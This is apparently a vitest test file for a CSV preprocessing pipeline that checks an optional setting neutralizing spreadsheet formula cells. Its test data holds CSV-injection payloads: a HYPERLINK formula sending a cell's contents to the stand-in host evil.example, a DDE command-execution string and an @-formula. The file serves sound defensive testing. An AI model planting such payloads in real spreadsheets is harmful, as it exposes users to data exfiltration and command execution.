import { readFile } from "node:fs/promises";

import Papa from "papaparse";
import { beforeAll, describe, expect, it } from "vitest";

import { DEFAULT_BROWSER_OPTIONS } from "@/lib/generatedContract";
import {
  buildRustV2Options,
  executeRustRuntime,
  setRustRuntimeForTesting,
} from "@/lib/rustPipelineRuntime";
import type { BrowserProcessingOptions } from "@/lib/types";
import * as runtimeWasm from "@/wasm/chronicle_preprocessing_runtime_wasm/pkg/chronicle_preprocessing_runtime_wasm.js";

/**
 * Security X3 through the shipped WASM runtime and the browser's own request
 * builder: the opt-in "Spreadsheet-safe CSV cells" setting.
 */
const HYPERLINK = '=HYPERLINK("https://evil.example/?d="&A1,"click")';
const DDE = "+cmd|'/c calc'!A0";
const AT = "@SUM(A1)";

const RAW = new TextEncoder().encode(
  [
    "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone",
    `Study,P01,Child,"${HYPERLINK.replaceAll('"', '""')}",Activity Resumed,app.a,2026-03-07 09:00:00,UTC`,
    `Study,P01,Child,"${HYPERLINK.replaceAll('"', '""')}",Activity Paused,app.a,2026-03-07 09:05:00,UTC`,
    `Study,P01,Child,${DDE},Activity Resumed,app.b,2026-03-07 10:00:00,UTC`,
    `Study,P01,Child,${DDE},Activity Paused,app.b,2026-03-07 10:05:00,UTC`,
    `Study,P01,Child,${AT},Activity Resumed,app.c,2026-03-07 11:00:00,UTC`,
    `Study,P01,Child,${AT},Activity Paused,app.c,2026-03-07 11:05:00,UTC`,
    "Study,P01,Child,,Screen Interactive,android,2026-03-07 08:59:00,UTC",
    "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 11:06:00,UTC",
  ].join("\n"),
);

const BASE: BrowserProcessingOptions = {
  ...DEFAULT_BROWSER_OPTIONS,
  studyName: "Formula neutralization",
  selectedTimezone: "UTC",
  timezoneHandling: "selected-convert",
  useFilterFile: false,
  useAppsForcingScreenOpenFile: false,
  useBackgroundAppsFile: false,
  useAppCodebook: false,
  enableAggregates: true,
};

async function csvArtifacts(options: BrowserProcessingOptions): Promise<Map<string, string>> {
  const run = await executeRustRuntime(RAW, "hostile.csv", options, undefined, {
    datetimeOfPreprocessing: "2026-07-22 00:00:00 UTC",
    persistRustWorkspace: false,
    incrementalEngine: false,
  });
  const decoder = new TextDecoder();
  return new Map(
    [...run.artifacts]
      .filter(([kind]) => kind.endsWith("-csv"))
      .map(([kind, bytes]) => [kind, decoder.decode(bytes)]),
  );
}

function cells(csv: string): string[][] {
  return Papa.parse<string[]>(csv, { header: false, skipEmptyLines: true }).data;
}

const FORMULA_START = /^[=+\-@\t\r]/;
const NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$|^[+-]Infinity$/;

describe("spreadsheet formula neutralization", () => {
  let off: Map<string, string>;
  let on: Map<string, string>;

  beforeAll(async () => {
    const bytes = await readFile(
      new URL(
        "../wasm/chronicle_preprocessing_runtime_wasm/pkg/chronicle_preprocessing_runtime_wasm_bg.wasm",
        import.meta.url,
      ),
    );
    runtimeWasm.initSync({ module: bytes });
    setRustRuntimeForTesting(runtimeWasm);
    off = await csvArtifacts(BASE);
    on = await csvArtifacts({ ...BASE, neutralizeSpreadsheetFormulas: true });
  }, 120_000);

  it("is off by default and sent only when on, so an off request keeps its exact bytes", () => {
    expect(DEFAULT_BROWSER_OPTIONS.neutralizeSpreadsheetFormulas).toBe(false);
    const runtime = { datetimeOfPreprocessing: "2026-07-22 00:00:00 UTC" };
    expect("neutralize_spreadsheet_formulas" in buildRustV2Options(BASE, runtime)).toBe(false);
    expect(
      buildRustV2Options({ ...BASE, neutralizeSpreadsheetFormulas: true }, runtime)
        .neutralize_spreadsheet_formulas,
    ).toBe(true);
  });

  it("off keeps every input value verbatim", () => {
    const labels = cells(off.get("app-csv") ?? "").flat();
    expect(labels).toContain(HYPERLINK);
    expect(labels).toContain(DDE);
    expect(labels).toContain(AT);
  });

  it("on prefixes exactly the formula-like text cells and leaves numbers untouched", () => {
    expect([...on.keys()].sort()).toEqual([...off.keys()].sort());
    expect(off.has("app-csv")).toBe(true);
    let prefixed = 0;
    let numbers = 0;
    for (const [kind, offCsv] of off) {
      const before = cells(offCsv);
      const after = cells(on.get(kind) ?? "");
      expect(after.length, kind).toBe(before.length);
      before.forEach((row, rowIndex) => {
        expect(after[rowIndex]?.length, `${kind} row ${rowIndex}`).toBe(row.length);
        row.forEach((cell, column) => {
          const neutralized = after[rowIndex]?.[column];
          if (FORMULA_START.test(cell) && !NUMBER.test(cell)) {
            expect(neutralized, `${kind} ${rowIndex}:${column}`).toBe(`'${cell}`);
            prefixed += 1;
          } else {
            expect(neutralized, `${kind} ${rowIndex}:${column}`).toBe(cell);
            if (NUMBER.test(cell)) numbers += 1;
          }
        });
      });
    }
    const appLabels = cells(on.get("app-csv") ?? "").flat();
    expect(appLabels).toContain(`'${HYPERLINK}`);
    expect(appLabels).toContain(`'${DDE}`);
    expect(appLabels).toContain(`'${AT}`);
    expect(prefixed).toBeGreaterThanOrEqual(3);
    expect(numbers).toBeGreaterThan(0);
  });
});
